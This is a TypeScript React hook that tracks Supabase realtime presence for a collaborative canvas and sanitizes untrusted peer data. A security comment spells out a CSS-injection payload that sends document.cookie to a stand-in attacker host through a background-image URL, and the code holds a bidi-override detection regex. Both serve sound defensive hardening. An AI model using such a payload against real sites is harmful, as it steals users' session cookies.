"use client";

import { useEffect, useState } from "react";
import { getSupabaseClient, isRealtimeAvailable } from "./supabase-client";

export interface SimplePresence {
  id: string;
  name: string;
  color: string;
  // Canvas-tool extensions (Phase 22). All optional so existing tools that
  // don't track them produce an identical presence record.
  cursor?: { x: number; y: number };               // world coords
  viewport?: { x: number; y: number; zoom: number; w: number; h: number };
  selection?: string[];                            // object IDs the peer has selected
  tool?: string;                                   // current toolbar choice ("select", "sticky", ...)
  // Phase 23 — ephemeral expressive presence:
  /** Cursor-chat bubble. Renders next to the cursor; expires at the
   * given epoch-ms (sender clears it client-side after a few seconds
   * by clearing the field; receivers also auto-clear by comparing
   * expiresAt to Date.now()). */
  chatBubble?: { text: string; expiresAt: number };
  /** Emoji reaction emitted at a world point; animates up and fades.
   * Same TTL pattern as chatBubble. */
  reaction?: { emoji: string; x: number; y: number; expiresAt: number };
}

const AVATAR_COLORS = ["#00f0ff", "#a78bfa", "#34d399", "#f59e0b", "#f87171", "#60a5fa", "#fb923c", "#e879f9"];

/**
 * RTL / LTR override codepoints — Unicode bidi format characters that can
 * flip rendering direction inside a benign-looking string. Using explicit
 * `\u` escapes here keeps the regex stable across file encodings (the raw
 * characters are invisible in most editors and frequently get mangled by
 * normalisation passes / git filters).
 *
 *   U+202A  LRE  Left-to-Right Embedding
 *   U+202B  RLE  Right-to-Left Embedding
 *   U+202C  PDF  Pop Directional Formatting
 *   U+202D  LRO  Left-to-Right Override
 *   U+202E  RLO  Right-to-Left Override
 *   U+2066  LRI  Left-to-Right Isolate
 *   U+2067  RLI  Right-to-Left Isolate
 *   U+2068  FSI  First Strong Isolate
 *   U+2069  PDI  Pop Directional Isolate
 */
// R5: built from a string literal with `\u` escapes so the source
// stays pure ASCII. The regex-literal form embedded raw bidi chars
// which the comment itself warns get "mangled by normalisation
// passes / git filters".
const RTL_OVERRIDE_RE = new RegExp("[\\u202A-\\u202E\\u2066-\\u2069]");

function randomColor(seed: string): string {
  let hash = 0;
  for (let i = 0; i < seed.length; i++) hash = (seed.charCodeAt(i) + hash * 31) | 0;
  // R5: `Math.abs(-2147483648)` stays -2147483648 in JS (no positive 32-bit
  // counterpart) → `negative % len` is negative → undefined index. Use the
  // mathematically-correct positive modulo.
  const len = AVATAR_COLORS.length;
  return AVATAR_COLORS[((hash % len) + len) % len];
}

export function usePresence(channelName: string | null, self?: Partial<SimplePresence>): SimplePresence[] {
  const [members, setMembers] = useState<SimplePresence[]>([]);

  useEffect(() => {
    if (!channelName || !isRealtimeAvailable()) return;
    const supabase = getSupabaseClient();
    if (!supabase) return;

    // R5: previously `self?.id ?? crypto.randomUUID()` was evaluated
    // here AND again inside `subscribe()` below. When `self?.id` was
    // undefined, two DIFFERENT UUIDs were generated → presence key
    // (channel level) ≠ tracked `me.id` (payload level), breaking any
    // consumer that joins them. Generate the id ONCE per channel mount
    // and reuse for both.
    // R8: prefer crypto.randomUUID → crypto.getRandomValues (also
     // available on Safari < 15.4) → Math.random as a last resort.
     // The Math.random fallback alone collides among same-second
     // joiners on Safari < 15.4.
    const generateAnonId = (): string => {
      const c = (typeof crypto !== "undefined" ? crypto : undefined);
      if (c?.randomUUID) return c.randomUUID();
      if (c?.getRandomValues) {
        const bytes = new Uint8Array(16);
        c.getRandomValues(bytes);
        return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
      }
      return `anon_${Date.now().toString(36)}_${Math.random().toString(36).slice(2)}`;
    };
    const myId = self?.id ?? generateAnonId();
    const channel = supabase.channel(channelName, {
      config: { presence: { key: myId } },
    });
    // Sanitize a presence record from an untrusted peer. The required
    // fields (id/name/color) must be strings; the optional canvas fields
    // (cursor/viewport/selection/tool) get individually validated so a
    // hostile peer can't:
    //   - inject a 10 MB selection array (DoS by memory)
    //   - send `cursor: "<script>"` and crash consumers that destructure x/y
    //   - pass NaN/Infinity coords that propagate into worldToScreen
    // Anything that fails validation gets dropped from the sanitized
    // record rather than rejecting the whole peer — better partial UX
    // than no UX.
    const SELECTION_CAP = 100; // ids; caps payload while still showing intent
    const NAME_CAP = 200;      // display name; caps DoS and bidi-spoof surface
    const ID_CAP = 200;
    const COLOR_CAP = 64;
    const sanitize = (v: unknown): SimplePresence | null => {
      if (!v || typeof v !== "object") return null;
      const r = v as Record<string, unknown>;
      if (typeof r.id !== "string" || typeof r.name !== "string" || typeof r.color !== "string") {
        return null;
      }
      // SECURITY: cap and reject the same bidi codepoints we already
      // reject on chatBubble / reaction. Without these caps a hostile
      // peer can broadcast a 10 MB name string (memory DoS) or an
      // RTL-override name that visually spoofs another user's identity
      // in the cursor list. ID and color get the same length cap to
      // bound the presence-state map's worst case.
      if (
        r.id.length === 0 || r.id.length > ID_CAP ||
        r.name.length === 0 || r.name.length > NAME_CAP ||
        r.color.length === 0 || r.color.length > COLOR_CAP ||
        RTL_OVERRIDE_RE.test(r.name) ||
        RTL_OVERRIDE_RE.test(r.id)
      ) return null;
      // SECURITY: `color` flows directly into inline-style properties
      // (border-color, background, color) on multiple cursor-overlay
      // elements. React's inline-style API does NOT sanitize CSS
      // values, so a peer broadcasting `color: "red; background-image:
      // url(http://attacker.example/?steal=" + document.cookie + ")"`
      // can exfiltrate data via the loaded image. CSS expression / -
      // moz-binding XSS is dead in modern browsers, but URL-fetch
      // exfiltration is alive and well. Restrict to a strict whitelist
      // of CSS color forms: #rgb, #rrggbb, #rrggbbaa, rgb()/rgba()/hsl()/
      // hsla() function calls (numbers + %, no urls), or a short
      // letters-only named-color token. Anything else falls back to a
      // safe default so the peer still appears but can't steer styles.
      const COLOR_SAFE_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/;
      const safeColor = COLOR_SAFE_RE.test(r.color.trim()) ? r.color.trim() : "#94a3b8";
      const out: SimplePresence = { id: r.id, name: r.name, color: safeColor };
      if (r.cursor && typeof r.cursor === "object") {
        const c = r.cursor as { x?: unknown; y?: unknown };
        if (typeof c.x === "number" && Number.isFinite(c.x) &&
            typeof c.y === "number" && Number.isFinite(c.y)) {
          out.cursor = { x: c.x, y: c.y };
        }
      }
      if (r.viewport && typeof r.viewport === "object") {
        const vp = r.viewport as Record<string, unknown>;
        if (typeof vp.x === "number" && Number.isFinite(vp.x) &&
            typeof vp.y === "number" && Number.isFinite(vp.y) &&
            typeof vp.zoom === "number" && Number.isFinite(vp.zoom) &&
            typeof vp.w === "number" && Number.isFinite(vp.w) &&
            typeof vp.h === "number" && Number.isFinite(vp.h)) {
          out.viewport = { x: vp.x, y: vp.y, zoom: vp.zoom, w: vp.w, h: vp.h };
        }
      }
      if (Array.isArray(r.selection)) {
        const ids: string[] = [];
        for (const id of r.selection) {
          if (typeof id === "string" && id.length < 500) ids.push(id);
          if (ids.length >= SELECTION_CAP) break;
        }
        out.selection = ids;
      }
      if (typeof r.tool === "string" && r.tool.length < 50) out.tool = r.tool;
      // chatBubble: text length cap (defends against an abusive peer
      // broadcasting megabyte payloads at 60 ms). expiresAt is an
      // epoch-ms; we cap it to 30 s from now to avoid sticky messages
      // that never auto-clear. SECURITY: also reject RTL/LTR override
      // codepoints up front so we never even build the bubble object
      // for a hostile payload (cheaper than allocating then deleting).
      if (r.chatBubble && typeof r.chatBubble === "object") {
        const cb = r.chatBubble as { text?: unknown; expiresAt?: unknown };
        if (
          typeof cb.text === "string" && cb.text.length > 0 && cb.text.length <= 200 &&
          !RTL_OVERRIDE_RE.test(cb.text) &&
          typeof cb.expiresAt === "number" && Number.isFinite(cb.expiresAt)
        ) {
          const cap = Date.now() + 30_000;
          out.chatBubble = { text: cb.text, expiresAt: Math.min(cb.expiresAt, cap) };
        }
      }
      // reaction: single-emoji string + finite world coords.
      // SECURITY: reject control codepoints that can flip layout
      // direction (U+202A-U+202E, U+2066-U+2069) or invisible
      // formatting characters that don't render as glyphs but expand
      // string length deceptively. 8 chars is a generous cap to
      // accommodate compound emojis like 👨‍👩‍👧‍👦 (4 ZWJ
      // sequences = ~7 chars).
      if (r.reaction && typeof r.reaction === "object") {
        const re = r.reaction as { emoji?: unknown; x?: unknown; y?: unknown; expiresAt?: unknown };
        const emojiStr = typeof re.emoji === "string" ? re.emoji : null;
        const hasControlCodes = emojiStr
          ? RTL_OVERRIDE_RE.test(emojiStr)
          : false;
        if (
          emojiStr && emojiStr.length > 0 && emojiStr.length <= 8 && !hasControlCodes &&
          typeof re.x === "number" && Number.isFinite(re.x) &&
          typeof re.y === "number" && Number.isFinite(re.y) &&
          typeof re.expiresAt === "number" && Number.isFinite(re.expiresAt)
        ) {
          const cap = Date.now() + 10_000;
          out.reaction = { emoji: emojiStr, x: re.x, y: re.y, expiresAt: Math.min(re.expiresAt, cap) };
        }
      }
      return out;
    };
    channel
      .on("presence", { event: "sync" }, () => {
        const state = channel.presenceState<SimplePresence>();
        const list: SimplePresence[] = [];
        for (const key of Object.keys(state)) {
          const metas = state[key];
          const first = Array.isArray(metas) ? metas[0] : undefined;
          const clean = sanitize(first);
          if (clean) list.push(clean);
        }
        setMembers(list);
      })
      .subscribe(async (status) => {
        // Until SUBSCRIBED, track() is a no-op. Without this call we listen
        // to other clients' presence but never publish our own — meaning
        // every "real-time multiplayer" tool in the suite would silently
        // show this user as missing to peers.
        if (status === "SUBSCRIBED") {
          // R5: reuse the SAME id used for the presence-key above so
          // peers can self-identify (presence-state key === me.id).
          const me: SimplePresence = {
            id: myId,
            name: self?.name ?? "Anonymous",
            color: self?.color ?? randomColor(self?.name ?? "anon"),
          };
          await channel.track(me);
        }
      });

    return () => {
      // R9: chain untrack → unsubscribe → removeChannel so LEAVE lands
      // before the channel is torn down (otherwise peers see a ghost
      // presence for ~60s until the server's TTL expires) AND so the
      // channel is freed from the Supabase client's internal
      // `channels[]` map. Every channelName change previously leaked
      // a RealtimeChannel + all its bound handler closures.
      void Promise.resolve(channel.untrack())
        .then(() => channel.unsubscribe())
        .catch(() => {});
      try { void getSupabaseClient()?.removeChannel(channel); } catch { /* client torn down */ }
    };
    // self is intentionally excluded from deps — callers usually pass an
    // inline object that re-creates each render. Re-subscribing on every
    // identity change would thrash. Channel name acts as the room key.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [channelName]);

  return members;
}
